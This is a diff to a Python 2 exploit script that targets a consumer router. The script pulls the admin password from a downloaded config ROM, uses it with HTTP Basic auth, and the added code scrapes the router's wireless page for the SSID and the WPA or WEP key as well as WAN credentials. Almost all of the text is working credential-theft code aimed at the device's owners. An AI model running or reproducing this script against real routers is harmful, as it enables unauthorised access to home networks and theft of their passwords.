@@ -6,6 +6,7 @@ from termcolor import colored
 import urllib2, base64
 import commands
 import bs4 as BeautifulSoup
+from mechanize import Browser
 
 def banner():
  print """
@@ -27,6 +28,7 @@ def download(ip,path):
   		html = response.read()
   	except:
   		print colored("NOT VULNERABLE !","red")
+  		exit()
 
   	try:
   		f = open(path,'w')
@@ -67,6 +69,32 @@ def wan_user(ip,password):
 		print "error downloading WAN username"
 		print colored("[-] may be not vulnerable", "yellow")
 
+def wlan_pass(ip,password):
+	try:
+		request = urllib2.Request("http://"+ip+"/basic/home_wlan.htm")
+		base64string = base64.encodestring('%s:%s' % ("admin", password)).replace('\n', '')
+		request.add_header("Authorization", "Basic %s" % base64string)   
+		result = urllib2.urlopen(request)
+		html=result.read()
+		soup = BeautifulSoup.BeautifulSoup(html, "lxml")
+		essid= soup.find("input",{"name":"ESSID"})["value"]
+		print "SSID = "+essid
+		try:
+			psk= soup.find("input",{"name":"PreSharedKey"})["value"]
+			print "WPA = "+psk
+		except:
+			wep = soup.find("input",{"name":"WEP_Key1"})["value"]
+			print "WEP = "+wep
+	except:
+		print "error downloading wlan"
+		print colored("[-] may be not vulnerable", "yellow")
+
+def initializer(ip,password):
+	url = "http://"+ip+"/"
+	username = 'admin'
+	browser = Browser()
+	browser.add_password(url, username, password)
+	browser.open(url)
 
 
 banner()
@@ -82,6 +110,10 @@ print colored("[+] Vulnerable", 'green')
 password = extract("rom01")
 password_wan = password[1].split(':')[1].strip()
 print "admin password : "+ password_wan
+initializer(ip,password_wan)
 print colored("[+] extracting WAN credentials ...","yellow")
 wan_user(ip,password_wan)
 wan_extract(ip,password_wan)
+
+print colored("[+] extracting Wireless conf ...","yellow")
+wlan_pass(ip,password_wan)
